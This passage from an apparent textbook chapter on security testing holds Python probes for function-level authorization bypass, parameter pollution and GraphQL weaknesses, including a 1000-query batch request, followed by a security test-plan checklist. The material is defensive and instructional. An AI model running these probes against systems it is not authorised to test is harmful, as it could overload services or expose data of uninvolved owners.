    # Regular user trying admin endpoints
    user_session = login_user(base_url, 'regularuser', 'password')
    admin_endpoints = [
        '/api/admin/users',
        '/api/admin/settings',
        '/api/admin/logs',
        '/api/users/all'
    ]
    
    for endpoint in admin_endpoints:
        response = user_session.get(f"{base_url}{endpoint}")
        if response.status_code == 200:
            issues.append(f"Function level authorization bypass: {endpoint}")
    
    # 10. Test for API parameter pollution
    response = requests.get(f"{base_url}/api/user",
                          params={'id': ['123', '456']})  # Multiple values
    # Check if causes unexpected behavior
    
    return issues

def test_graphql_security(graphql_url):
    """Test GraphQL-specific security issues"""
    
    issues = []
    
    # Test 1: Introspection enabled
    introspection_query = {
        'query': '''
        {
            __schema {
                types {
                    name
                    fields {
                        name
                    }
                }
            }
        }
        '''
    }
    
    response = requests.post(graphql_url, json=introspection_query)
    if response.status_code == 200 and '__schema' in response.text:
        issues.append("GraphQL introspection enabled in production")
    
    # Test 2: Query depth limit
    deep_query = {
        'query': '''
        {
            user {
                posts {
                    comments {
                        author {
                            posts {
                                comments {
                                    author {
                                        posts {
                                            title
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        '''
    }
    
    response = requests.post(graphql_url, json=deep_query)
    if response.status_code == 200:
        issues.append("No GraphQL query depth limit")
    
    # Test 3: Batch attack
    batch_query = [
        {'query': '{ user(id: 1) { name email } }'},
        {'query': '{ user(id: 2) { name email } }'},
        # Repeat 1000 times
    ] * 1000
    
    response = requests.post(graphql_url, json=batch_query)
    if response.status_code == 200:
        issues.append("GraphQL accepts large batched queries (DoS risk)")
    
    # Test 4: Field suggestions
    malformed_query = {
        'query': '{ user { naem email } }'  # Typo in 'name'
    }
    
    response = requests.post(graphql_url, json=malformed_query)
    if 'did you mean' in response.text.lower():
        issues.append("GraphQL provides field suggestions (info disclosure)")
    
    return issues
```

## Security Test Plans and Checklists

Creating comprehensive security test plans ensures consistent coverage.

```markdown
# Security Test Plan Template

## 1. Pre-Testing Phase

### 1.1 Scope Definition
- [ ] Identify all applications/APIs in scope
- [ ] Define IP ranges and domains
- [ ] List out-of-scope items
- [ ] Obtain written authorization
- [ ] Define testing windows

### 1.2 Information Gathering
- [ ] Passive reconnaissance (DNS, WHOIS, search engines)
- [ ] Technology stack identification
- [ ] Third-party service identification
- [ ] SSL/TLS certificate analysis

## 2. Authentication Testing

### 2.1 Credential Policy
- [ ] Test password complexity requirements
- [ ] Test for default credentials
- [ ] Test username enumeration
- [ ] Test account lockout mechanism
- [ ] Test password reset functionality

### 2.2 Session Management
- [ ] Test session token randomness
- [ ] Test session fixation
- [ ] Test session timeout
- [ ] Test concurrent session handling
- [ ] Test logout functionality
- [ ] Test cookie security flags (Secure, HttpOnly, SameSite)

### 2.3 Multi-Factor Authentication
- [ ] Test MFA bypass techniques
- [ ] Test MFA token reuse
- [ ] Test backup codes security
- [ ] Test "Remember this device" functionality

## 3. Authorization Testing

### 3.1 Horizontal Privilege Escalation
- [ ] Access other users' data by modifying user ID
- [ ] Test for IDOR vulnerabilities
- [ ] Test API endpoint authorization

### 3.2 Vertical Privilege Escalation
- [ ] Regular user accessing admin functions
- [ ] Parameter manipulation (role, isAdmin, etc.)
- [ ] Test for missing function-level access control

## 4. Input Validation Testing

### 4.1 Injection Attacks
- [ ] SQL Injection (all parameters, all pages)
- [ ] NoSQL Injection
- [ ] OS Command Injection
- [ ] LDAP Injection
- [ ] XML Injection
- [ ] XPath Injection
- [ ] Template Injection

### 4.2 Cross-Site Scripting
- [ ] Reflected XSS (all input fields)
- [ ] Stored XSS (all data storage points)
- [ ] DOM-based XSS
- [ ] XSS in file uploads
- [ ] XSS in error messages

### 4.3 File Handling
- [ ] File upload restrictions
- [ ] File type validation bypass
- [ ] Path traversal
- [ ] Malicious file execution
- [ ] File inclusion vulnerabilities (LFI/RFI)

## 5. Business Logic Testing

- [ ] Race conditions
- [ ] Price/quantity manipulation
- [ ] Workflow bypass
- [ ] Negative values acceptance
- [ ] Boundary value issues

## 6. Cryptography Testing

- [ ] Weak SSL/TLS configuration
- [ ] Weak encryption algorithms
- [ ] Insecure random number generation
- [ ] Hardcoded secrets
- [ ] Sensitive data in transit
- [ ] Sensitive data at rest

## 7. Error Handling

- [ ] Verbose error messages
- [ ] Stack traces exposure
- [ ] Database error messages
- [ ] Custom error pages exist

## 8. Infrastructure Testing

- [ ] Open ports and services
- [ ] Unnecessary services running
- [ ] Server/software version disclosure
- [ ] Security headers configuration
- [ ] CORS configuration
- [ ] Directory listing enabled

## 9. API Security Testing

- [ ] API authentication
- [ ] API rate limiting
- [ ] Mass assignment
- [ ] Excessive data exposure
- [ ] API versioning issues
- [ ] GraphQL specific issues

## 10. Third-Party Components

- [ ] Vulnerable dependencies (SCA)
- [ ] Outdated libraries/frameworks
- [ ] Vulnerable WordPress plugins (if applicable)
- [ ] Insecure npm packages

## 11. Client-Side Testing

- [ ] DOM-based vulnerabilities
- [ ] Client-side validation bypass
- [ ] Sensitive data in JavaScript
- [ ] Source code comments
- [ ] API keys in client code

## 12. Security Configuration

- [ ] Default configurations
- [ ] Unnecessary features enabled
- [ ] Administrative interfaces exposed
- [ ] Security patches applied
- [ ] Secure deployment

## Reporting Phase

### Findings Documentation
For each vulnerability found:
- [ ] Severity rating (Critical/High/Medium/Low)
- [ ] Detailed description
- [ ] Steps to reproduce
- [ ] Proof of concept
- [ ] Impact assessment
- [ ] Remediation recommendations
- [ ] References (CWE, OWASP, CVE)

### Executive Summary
- [ ] Overall risk rating
- [ ] Number of findings by severity
- [ ] Critical issues requiring immediate attention
- [ ] Risk to business
- [ ] Recommended prioritization
```

## Conclusion

Security testing is not a one-time activity but an ongoing practice that must be integrated into every phase of the software development lifecycle. As a QA engineer, your role in security testing is crucial—you're often the last line of defense before code reaches production.

The techniques and tools covered in this chapter provide a solid foundation for identifying common security vulnerabilities. Remember that security testing requires:

1. **Continuous Learning**: New vulnerabilities and attack techniques emerge constantly. Stay updated with OWASP, security blogs, and vulnerability databases.

2. **A Security Mindset**: Always think like an attacker. Question assumptions. Test edge cases. Look for ways things can break.

3. **Automation**: Manual testing is essential for complex scenarios, but automate what you can. Integrate SAST/DAST into CI/CD pipelines.

4. **Collaboration**: Work closely with developers and security teams. Security is everyone's responsibility.

5. **Responsible Disclosure**: Always test in authorized environments. Report vulnerabilities through proper channels.

The security landscape will continue to evolve, but the fundamental principles remain: validate all input, enforce authentication and authorization, encrypt sensitive data, configure systems securely, and maintain defense in depth. Master these fundamentals, stay curious, and you'll make a significant impact on your organization's security posture.

In the next chapter, we'll explore chaos engineering and reliability testing—complementary disciplines that help ensure systems remain secure and stable even under adverse conditions.